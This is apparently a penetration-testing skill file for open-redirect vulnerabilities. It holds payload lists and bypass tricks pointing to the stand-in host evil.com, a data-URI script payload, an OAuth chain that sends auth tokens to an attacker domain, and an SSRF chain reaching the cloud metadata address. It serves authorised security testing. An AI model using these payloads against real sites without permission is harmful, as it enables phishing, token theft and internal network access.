---
name: open_redirect
description: Open redirect discovery, bypass, and chaining techniques
applicable_contexts: [web, api, oauth]
---

## Open Redirect Testing

### Common Parameters

`?url=`, `?redirect=`, `?next=`, `?return=`, `?returnUrl=`, `?goto=`, `?dest=`,
`?destination=`, `?continue=`, `?rurl=`, `?target=`, `?view=`, `?redir=`

### Basic Payloads

```
https://evil.com
//evil.com
\/\/evil.com
/\evil.com
https:evil.com
http://evil.com%2f%2f
//evil.com/%2f..
```

### Bypass Techniques

| Technique | Payload |
|-----------|---------|
| Protocol-relative | `//evil.com` |
| Backslash | `\/\/evil.com` |
| URL encoding | `https%3a%2f%2fevil.com` |
| Subdomain | `https://target.com.evil.com` |
| @ in URL | `https://target.com@evil.com` |
| Whitespace | `https://evil.com%20.target.com` |
| Tab/newline | `https://evil.com%09.target.com` |
| Fragment | `https://target.com#@evil.com` |
| Null byte | `https://evil.com%00.target.com` |
| Data URI | `data:text/html,<script>window.location='https://evil.com'</script>` |

### Chaining with OAuth

```
1. Start OAuth flow
2. Redirect URI: https://target.com/callback?next=https://evil.com
3. After auth, user redirected to evil.com with OAuth code/token
4. Attacker captures authentication token
```

### Chaining with SSRF

Open redirect on internal service → use as proxy:
```
GET /proxy?url=http://internal-app/redirect?url=http://169.254.169.254/
```

### JavaScript-Based Redirects

```javascript
// Test: inject URL in JS context
location.href = USER_INPUT
window.location = USER_INPUT
location.assign(USER_INPUT)
location.replace(USER_INPUT)
// Also: meta refresh, form action
```

### Validation Requirements

- Demonstrate actual redirect to attacker-controlled domain
- Show HTTP response with 301/302 and Location header (or JS redirect)
- Test: does the redirect happen pre- or post-authentication?
- Document parameter and bypass technique used

### Business Impact

- Phishing amplification (victim sees trusted domain in URL)
- OAuth token theft via redirect_uri manipulation
- XSS chaining: `javascript:` protocol in redirect
- SEO spam via redirect abuse
